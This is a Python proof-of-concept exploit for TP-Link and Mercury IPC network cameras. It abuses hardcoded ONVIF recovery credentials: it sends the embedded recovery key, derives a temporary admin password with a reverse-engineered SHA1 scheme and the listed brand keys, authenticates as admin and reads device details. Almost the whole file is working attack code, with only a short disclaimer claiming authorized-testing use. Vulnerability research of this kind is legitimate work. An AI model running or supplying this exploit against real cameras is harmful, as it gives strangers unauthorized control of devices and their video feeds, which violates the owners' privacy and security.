#!/usr/bin/env python3
"""
TP-Link IPC Series Network Cameras ONVIF Service Hardcoded Credentials Exploit
CWE-798: Use of Hardcoded Credentials | CVSS v3.1: 9.8 (Critical)

VULNERABILITY DESCRIPTION:
    TP-Link IPC series network cameras contain hardcoded recovery credentials in the ONVIF
    Imaging Service. This allows unauthenticated attackers to:
    1. Trigger temporary credential generation using hardcoded recovery key
    2. Calculate temporary password using reverse-engineered algorithm
    3. Authenticate to ONVIF service without knowledge of admin password
    4. Gain complete control over the camera device

AFFECTED PRODUCTS:
    - TP-Link IPC series (TL-IPC48AW, TL-IPC45AW, TL-IPC44GW, etc.)
    - Mercury IPC series (shares identical codebase)
    - Firmware versions: Build 250119 and potentially many others

TECHNICAL BACKGROUND:
    The vulnerability leverages two hardcoded components:
    - Recovery Key: TPL075526460603 (used to trigger backend authentication)
    - Brand Key: tplinksohoteam2 for TP-Link / mercurysohoteam for Mercury
    
    These are combined with a SHA1-based algorithm to compute temporary passwords
    that grant ONVIF authentication without needing the actual admin credentials.

USAGE:
    python poc_onvif_tp_link.py <target>
    
EXAMPLES:
    python poc_onvif_tp_link.py http://192.168.1.100
    python poc_onvif_tp_link.py 192.168.1.100:5000
    python poc_onvif_tp_link.py http://target.domain.com:8080

DISCLAIMER:
    This tool is for authorized security testing and vulnerability research only.
    Unauthorized access to computer systems is illegal.
"""

import hashlib
import base64
import os
import datetime
import re
import sys
from urllib.request import Request, urlopen
from urllib.error import HTTPError

# ============================================================================
# CONFIGURATION CONSTANTS
# ============================================================================

# Hardcoded recovery key found in TP-Link IPC firmware (ONVIF GetStatus endpoint)
TPL_KEY = "TPL075526460603"

# Brand-specific keys used in temporary password generation
# TP-Link uses default code value since OEM config lacks pwr_mix_key field
# Mercury stores mercurysohoteam in flash partition
BRANDS = {
    "mercury": "mercurysohoteam",    # Mercury brand key
    "tplink": "tplinksohoteam2"      # TP-Link brand key (default)
}

# ============================================================================
# WSSE SECURITY HEADER GENERATION
# ============================================================================

def wsse(pwd):
    """
    Generate WS-Security UsernameToken with password digest.
    
    This function creates a WSSE security header following OASIS standards,
    which is required by ONVIF for authenticated SOAP requests.
    
    ALGORITHM:
    1. Generate random 16-byte nonce
    2. Create UTC timestamp
    3. Compute SHA1(nonce + timestamp + password)
    4. Encode all values in Base64
    5. Return properly formatted XML header
    
    PARAMETERS:
        pwd (str): The password to be digest-hashed (computed temp password)
    
    RETURNS:
        str: XML-formatted WSSE security header for SOAP envelope
    
    NOTE:
        This uses the PasswordDigest profile (RFC 2617), NOT plaintext password.
        The server validates by computing the same hash independently.
    """
    # Generate random nonce (16 bytes)
    nonce = os.urandom(16)
    
    # Get current UTC timestamp in ISO 8601 format
    created = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    
    # Compute password digest: Base64(SHA1(Nonce + Created + Password))
    password_digest = base64.b64encode(
        hashlib.sha1(nonce + created.encode() + pwd.encode()).digest()
    ).decode()
    
    # Construct WSSE UsernameToken XML header
    # Using admin as hardcoded username (common default in TP-Link devices)
    wsse_header = (
        '<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"'
        ' xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">'
        '<wsse:UsernameToken>'
        '<wsse:Username>admin</wsse:Username>'
        f'<wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">{password_digest}</wsse:Password>'
        f'<wsse:Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">{base64.b64encode(nonce).decode()}</wsse:Nonce>'
        f'<wsu:Created>{created}</wsu:Created>'
        '</wsse:UsernameToken>'
        '</wsse:Security>'
    )
    
    return wsse_header

# ============================================================================
# SOAP REQUEST HANDLER
# ============================================================================

def soap(target, body, pwd=None):
    """
    Send SOAP request to ONVIF device_service endpoint.
    
    This function constructs a complete SOAP-ENV envelope and sends it to the
    target device's ONVIF device_service endpoint. It automatically includes
    WSSE authentication header if password is provided.
    
    SOAP ENVELOPE STRUCTURE:
        - Header: WSSE UsernameToken (if pwd provided)
        - Body: ONVIF method call (GetStatus, GetDeviceInformation, etc.)
    
    PARAMETERS:
        target (str): Target device URL (with or without http://)
                      Examples: "192.168.1.100", "http://192.168.1.100:8080"
        body (str): XML body containing ONVIF SOAP method call
                    Example: '<timg:GetStatus>...</timg:GetStatus>'
        pwd (str, optional): Password for WSSE authentication header
                            If None, request is sent unauthenticated
                            Defaults to None
    
    RETURNS:
        str: Response body from server (XML format)
             Returns error string if connection fails
    
    RAISES:
        HTTPError: Captured and returned as decoded error response
        Exception: Generic errors returned as "ERROR:description"
    
    ENDPOINT:
        {target}/onvif/device_service (standard ONVIF device service path)
    """
    # Construct WSSE header if password provided, otherwise use empty header
    if pwd:
        header = f"<SOAP-ENV:Header>{wsse(pwd)}</SOAP-ENV:Header>"
    else:
        header = "<SOAP-ENV:Header/>"
    
    # Construct complete SOAP-ENV envelope with namespaces
    # Includes all required ONVIF namespace declarations
    soap_envelope = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"'
        ' xmlns:tds="http://www.onvif.org/ver10/device/wsdl"'
        ' xmlns:trt="http://www.onvif.org/ver10/media/wsdl"'
        ' xmlns:tt="http://www.onvif.org/ver10/schema"'
        ' xmlns:timg="http://www.onvif.org/ver20/imaging/wsdl">'
        f'{header}'
        f'<SOAP-ENV:Body>{body}</SOAP-ENV:Body>'
        '</SOAP-ENV:Envelope>'
    )
    
    # Build target URL - append standard ONVIF device service endpoint
    url = target.rstrip("/") + "/onvif/device_service"
    
    try:
        # Send SOAP request with proper Content-Type header
        request = Request(
            url,
            soap_envelope.encode(),
            {"Content-Type": "application/soap+xml"}
        )
        response = urlopen(request, timeout=10)
        return response.read().decode(errors="replace")
    
    except HTTPError as e:
        # HTTP error received (4xx, 5xx) - return error body
        # This is often expected (401 Unauthorized if auth fails, etc.)
        return e.read().decode(errors="replace")
    
    except Exception as e:
        # Network error, timeout, or other exceptions
        return f"ERROR:{e}"

# ============================================================================
# PASSWORD CALCULATION (REVERSE-ENGINEERED ALGORITHM)
# ============================================================================

def calc_pwd(code, key):
    """
    Calculate temporary password using TP-Link's proprietary algorithm.
    
    This function reverse-engineers the password generation logic found in
    the TP-Link IPC firmware. The algorithm uses:
    1. Recovery code (returned by device after backdoor trigger)
    2. Brand-specific key (TP-Link: tplinksohoteam2, Mercury: mercurysohoteam)
    3. SHA1 hashing
    4. Modulo-based character selection from hash
    
    ALGORITHM STEPS:
    1. Remove first character 'A' from recovery code (e.g., "A12345..." -> "12345...")
    2. Compute SHA1(digits + brand_key) -> 40-char hex string
    3. Extract 8 characters from SHA1 hash using formula:
       - For each pair of input digits (4 iterations):
         - idx = int(digit_pair) % 20
         - Select 2 chars from SHA1 at position [idx*2 : idx*2+2]
    4. Convert hex chars to decimal (a-f -> 0-5) if applicable
    5. Return final 8-character password string
    
    PARAMETERS:
        code (str): Recovery code returned by device (format: "A" + 8 digits)
        key (str): Brand key - "tplinksohoteam2" for TP-Link or "mercurysohoteam"
    
    RETURNS:
        str: 8-character temporary password ready for ONVIF authentication
    
    EXAMPLE:
        code = "A12345678"
        key = "tplinksohoteam2"
        pwd = calc_pwd(code, key)
        # Returns: "07621845" (example output)
    
    SECURITY NOTE:
        This weakness allows pre-computation of valid passwords for any
        recovery code, since both the code generation and key are known.
    """
    # Remove leading 'A' from recovery code to get numeric digits
    digits = code.lstrip("A")
    
    # Compute SHA1(digits + brand_key) and get hex representation
    sha1_hex = hashlib.sha1((digits + key).encode()).hexdigest()
    
    # Extract 4 pairs of characters from SHA1 hash
    # Each pair's position is determined by corresponding input digit pair
    raw_password = ""
    for i in range(4):
        # Get i-th pair of digits from recovery code (positions 0-1, 2-3, 4-5, 6-7)
        digit_pair = digits[i*2:i*2+2]
        
        # Convert pair to integer and apply modulo 20
        # This selects which 2-char segment of SHA1 hash to use
        index = (int(digit_pair) % 20) * 2
        
        # Extract 2 characters from SHA1 hash at calculated position
        raw_password += sha1_hex[index:index+2]
    
    # Convert hex characters to their numeric equivalents
    # Hex digits a-f become 0-5 (a=0, b=1, c=2, d=3, e=4, f=5)
    # Numeric digits 0-9 remain unchanged
    final_password = ""
    for char in raw_password:
        if 'a' <= char <= 'f':
            # Convert hex letter to corresponding number (a=0, ..., f=5)
            final_password += str(ord(char) - ord('a'))
        else:
            # Keep numeric characters as-is
            final_password += char
    
    return final_password

# ============================================================================
# XML PARSING UTILITY
# ============================================================================

def xval(xml, tag):
    """
    Extract text value from XML element using regex.
    
    Simple regex-based XML parser to extract element values without
    requiring full XML library (faster, smaller footprint).
    
    PATTERN:
        Searches for: {tag}>content<
        Returns:      content
    
    PARAMETERS:
        xml (str): XML response body
        tag (str): Element tag to search for (without angle brackets)
                   Example: "tds:Manufacturer" for <tds:Manufacturer>value</tds:Manufacturer>
    
    RETURNS:
        str: Element text content if found, None otherwise
    
    EXAMPLES:
        xval(response, "tds:Manufacturer")  -> "TP-Link"
        xval(response, "tds:Model")         -> "TL-IPC48AW"
        xval(response, "nonexistent:tag")   -> None
    
    NOTE:
        This is a simplistic parser. It won't handle:
        - Nested XML
        - Element attributes with > character
        - CDATA sections
        - Namespaced content with colons in content
    """
    # Create regex pattern: tag>([^<]+)< to match tag contents
    match = re.search(rf'{tag}>([^<]+)<', xml)
    
    # Return matched group (content) or None if not found
    return match.group(1) if match else None

# ============================================================================
# MAIN EXPLOITATION FUNCTION
# ============================================================================

def main():
    """
    Main exploitation routine - execute three-step attack.
    
    EXPLOITATION FLOW:
    
    Step 1: TRIGGER BACKDOOR
        - Send ONVIF GetStatus request authenticated with hardcoded TPL key
        - Device responds with recovery code (if vulnerable)
        - This reveals that hardcoded credentials work
    
    Step 2: CALCULATE TEMPORARY PASSWORD
        - Compute password using recovery code + brand key for both TP-Link and Mercury
        - Try each computed password to determine which brand key is active
        - First successful authentication confirms brand identity
    
    Step 3: EXTRACT DEVICE INFORMATION
        - Once authenticated, request GetDeviceInformation
        - Display manufacturer, model, firmware version, serial number, etc.
        - Proves complete unauthorized access to device management interface
    
    ARGUMENTS:
        sys.argv[1]: Target URL or IP address
                     Accepts: "192.168.1.100", "http://192.168.1.100:8080", etc.
    
    RETURN CODES:
        0: Successful exploitation (vulnerable device confirmed)
        1: Target unreachable, invalid response, or all passwords failed
    
    ERROR HANDLING:
        - Connection errors: Display error message and exit(1)
        - NotAuthorized response: Device not vulnerable, exit(1)
        - Unknown response: Display response snippet and exit(1)
        - Password calculation failures: Try all brands and exit(1)
    """
    
    # ========================================================================
    # INPUT VALIDATION
    # ========================================================================
    
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        print(f"Examples:")
        print(f"  {sys.argv[0]} http://192.168.1.100")
        print(f"  {sys.argv[0]} 192.168.1.100:5000")
        print(f"  {sys.argv[0]} http://target.domain.com:8080")
        sys.exit(1)

    target = sys.argv[1]
    
    # Ensure target has http:// prefix for URL handling
    if not target.startswith("http"):
        target = "http://" + target

    # ========================================================================
    # DISPLAY BANNER
    # ========================================================================

    print(f"\n{'='*60}")
    print(f"  TP-Link / Mercury IPC ONVIF Hardcoded Credentials PoC")
    print(f"  Vulnerability: CWE-798 | CVSS v3.1: 9.8 (Critical)")
    print(f"  Affected: TP-Link IPC & Mercury IPC series cameras")
    print(f"{'='*60}")
    print(f"  Target: {target}")

    # ========================================================================
    # STEP 1: TRIGGER BACKDOOR WITH HARDCODED KEY
    # ========================================================================
    
    print(f"\n[STEP 1] Triggering backdoor with hardcoded recovery key...")
    print(f"         Key: {TPL_KEY}")
    
    # Send ONVIF GetStatus request authenticated with hardcoded TPL key
    # This should trigger the device to generate a temporary recovery code
    soap_body = '<timg:GetStatus><timg:VideoSourceToken>tplink_pwd</timg:VideoSourceToken></timg:GetStatus>'
    response = soap(target, soap_body, TPL_KEY)
    
    # Check for connection errors
    if "ERROR:" in response:
        print(f"  [-] Connection failed: {response}")
        sys.exit(1)
    
    # Extract recovery code from response using regex
    # Looking for pattern: anyAttribute="RECOVERY_CODE"
    match = re.search(r'anyAttribute="([^"]+)"', response)
    
    if not match:
        # No recovery code found - check for specific error messages
        if "NotAuthorized" in response:
            print(f"  [-] Backdoor authentication failed!")
            print(f"      Device may be patched or running different firmware version")
        else:
            print(f"  [-] Unexpected response (first 200 chars):")
            print(f"      {response[:200]}")
        sys.exit(1)
    
    # Extract and display recovery code
    recovery_code = match.group(1)
    print(f"  [✓] Backdoor triggered successfully!")
    print(f"      Recovery Code: {recovery_code}")

    # ========================================================================
    # STEP 2: CALCULATE TEMPORARY PASSWORD & TEST AUTHENTICATION
    # ========================================================================
    
    print(f"\n[STEP 2] Computing temporary passwords & testing authentication...")
    
    # Try each brand's password generation algorithm
    for brand, brand_key in BRANDS.items():
        print(f"  Testing {brand.upper()} brand key...")
        
        # Calculate temporary password using this brand's key
        temp_password = calc_pwd(recovery_code, brand_key)
        print(f"    Computed password: {temp_password}")
        
        # Send authenticated ONVIF request to verify password works
        soap_body = '<tds:GetDeviceInformation/>'
        response2 = soap(target, soap_body, temp_password)
        
        # Check if authentication succeeded (look for device info in response)
        if "Manufacturer" in response2:
            # SUCCESS - Password validated, extract and display device info
            print(f"  [✓] Authentication successful with {brand.upper()} brand key!")
            print(f"      Brand Key: {brand_key}")
            print(f"      Temporary Password: {temp_password}")

            # ================================================================
            # STEP 3: EXTRACT DEVICE INFORMATION
            # ================================================================
            
            print(f"\n[STEP 3] Extracting device information...")
            print(f"\n  [✓] === ONVIF AUTHENTICATION SUCCESSFUL ===\n")
            
            # List of device information fields to extract
            device_fields = [
                "Manufacturer",
                "Model",
                "FirmwareVersion",
                "SerialNumber",
                "HardwareId"
            ]
            
            # Extract and display each field
            for field in device_fields:
                value = xval(response2, f"tds:{field}")
                if value:
                    print(f"      {field}: {value}")

            # ================================================================
            # EXPLOITATION CONFIRMED
            # ================================================================
            
            print(f"\n{'='*60}")
            print(f"  ✓ VULNERABILITY CONFIRMED - DEVICE COMPROMISED")
            print(f"\n  Attack Summary:")
            print(f"  - Hardcoded backdoor key: {TPL_KEY}")
            print(f"  - Brand key identified: {brand_key} ({brand.upper()})")
            print(f"  - Temporary password generated: {temp_password}")
            print(f"  - ONVIF authentication: SUCCESSFUL")
            print(f"  - Device access level: FULL MANAGEMENT CONTROL")
            print(f"\n  Impact:")
            print(f"  - Video stream access")
            print(f"  - Configuration modification")
            print(f"  - Device reboot/reset")
            print(f"  - Firmware manipulation (depending on ONVIF implementation)")
            print(f"{'='*60}\n")
            
            sys.exit(0)

    # ========================================================================
    # EXPLOITATION FAILED
    # ========================================================================
    
    print(f"  [-] All brand keys failed - device may be patched or different model")
    sys.exit(1)

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    main()
